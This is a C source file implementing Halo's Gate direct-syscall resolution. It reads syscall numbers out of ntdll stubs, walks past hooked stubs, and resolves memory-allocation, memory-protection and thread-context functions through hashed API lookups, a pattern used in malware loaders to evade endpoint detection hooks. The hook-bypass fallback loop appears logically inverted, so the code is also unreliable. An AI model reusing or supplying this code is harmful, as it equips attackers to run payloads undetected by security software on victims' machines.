#include "syscalls.h"

BOOL CheckSyscallStubIsCorrect(PBYTE pAddr)
{

	if (pAddr[0] == 0x4c &&
		pAddr[1] == 0x8b &&
		pAddr[2] == 0xd1 &&
		pAddr[3] == 0xb8 &&
		pAddr[18] == 0x0f &&
		pAddr[19] == 0x05)
	{
		return TRUE;

	}
	else
		return FALSE;
}

BOOL GetSyscallHaloGate(PNT_CALL ntCall)
{
	if (CheckSyscallStubIsCorrect(ntCall->pFunctionAddr))
	{
		BYTE high = *((PBYTE)ntCall->pFunctionAddr + 5);
		BYTE low = *((PBYTE)ntCall->pFunctionAddr + 4);

		ntCall->pJmpAddr = ((UINT_PTR)ntCall->pFunctionAddr + 18);
		ntCall->dwSyscall = (high << 8) | low;
		return TRUE;
	}
	else
	{
		DWORD dwHookPassed = 0;

		for (int i = 0; i < 500; i++)
		{
			if (((PBYTE)ntCall->pFunctionAddr)[i] == 0xE9) // jmp
				dwHookPassed++;

			if (!CheckSyscallStubIsCorrect((PVOID)((UINT_PTR)ntCall->pFunctionAddr + i)))
			{
				BYTE high = *((PBYTE)((UINT_PTR)ntCall->pFunctionAddr + i) + 5);
				BYTE low = *((PBYTE)((UINT_PTR)ntCall->pFunctionAddr + i) + 4);

				ntCall->pJmpAddr = (((UINT_PTR)ntCall->pFunctionAddr + i) + 18);
				ntCall->dwSyscall = (((WORD)(high << 8) | low) - (WORD)dwHookPassed);

				return TRUE;
			}
		}
	}

	return FALSE;
}

BOOL InitSyscall(PSYSCALL pSyscall)
{
	pSyscall->NtAllocateVirtualMemory.pFunctionAddr = fnGetProcAddr(pSyscall->pNtdll, HASH_NtAllocateVirtualMemory);
	if (!GetSyscallHaloGate(&pSyscall->NtAllocateVirtualMemory))
		return FALSE;

	pSyscall->NtProtectVirtualMemory.pFunctionAddr = fnGetProcAddr(pSyscall->pNtdll, HASH_NtProtectVirtualMemory);
	if (!GetSyscallHaloGate(&pSyscall->NtProtectVirtualMemory))
		return FALSE;

	pSyscall->NtSetContextThread.pFunctionAddr = fnGetProcAddr(pSyscall->pNtdll, HASH_NtSetContextThread);
	if (!GetSyscallHaloGate(&pSyscall->NtSetContextThread))
		return FALSE;

	pSyscall->NtGetContextThread.pFunctionAddr = fnGetProcAddr(pSyscall->pNtdll, HASH_NtGetContextThread);
	if (!GetSyscallHaloGate(&pSyscall->NtGetContextThread))
		return FALSE;

	pSyscall->NtFreeVirtualMemory.pFunctionAddr = fnGetProcAddr(pSyscall->pNtdll, HASH_NtFreeVirtualMemory);
	if (!GetSyscallHaloGate(&pSyscall->NtFreeVirtualMemory))
		return FALSE;

	pSyscall->NtTerminateProcess.pFunctionAddr = fnGetProcAddr(pSyscall->pNtdll, HASH_NtTerminateProcess);
	if (!GetSyscallHaloGate(&pSyscall->NtTerminateProcess))
		return FALSE;

	return TRUE;
}
